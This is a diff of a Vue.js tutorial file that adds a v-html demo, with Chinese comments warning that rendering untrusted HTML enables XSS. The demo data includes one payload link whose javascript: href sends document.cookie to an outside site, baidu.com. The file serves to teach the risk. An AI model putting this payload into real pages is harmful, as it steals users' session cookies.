@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>内置指令</title>
+    <title>v-html指令</title>
     <script type="text/javascript" src="../js/vue.js"></script>
     <script type="text/javascript" src="../js/dayjs.min.js"></script>
 </head>
@@ -10,11 +10,22 @@
 
 <div id="root">
     <!--
-       41
+       本节41：cookie的工作原理
+                类似于json的字符串，key-value
+       v-html指令：
+            1.作用：向指定节点中渲染包含HTML结构的内容
+            2.与插值语法的区别：
+                ①.v-html会替换掉节点中的所有内容，{{xx}}则不会
+                ②.v-html可以识别HTML结构。
+            3.严重注意：v-html有安全性问题！！！
+                ①.在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击。 XXS冒充用户之手
+                ②.一定要在可信的内容上使用v-html，永远不要用在用户提交的内容上！
        -->
 
     <div>你好，{{name}}</div>
     <div v-text="name">你好，{{name}}</div>
+    <div v-html="str"></div>
+    <div v-html="str2"></div>
 </div>
 
 </body>
@@ -27,7 +38,9 @@
     new Vue({
         el: '#root',
         data: {
-            name:'尚硅谷！'
+            name:'尚硅谷！',
+            str:"<h3>你好呀！</h3>",
+            str2:'<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>点我有惊喜</a>'
         },
     })
 
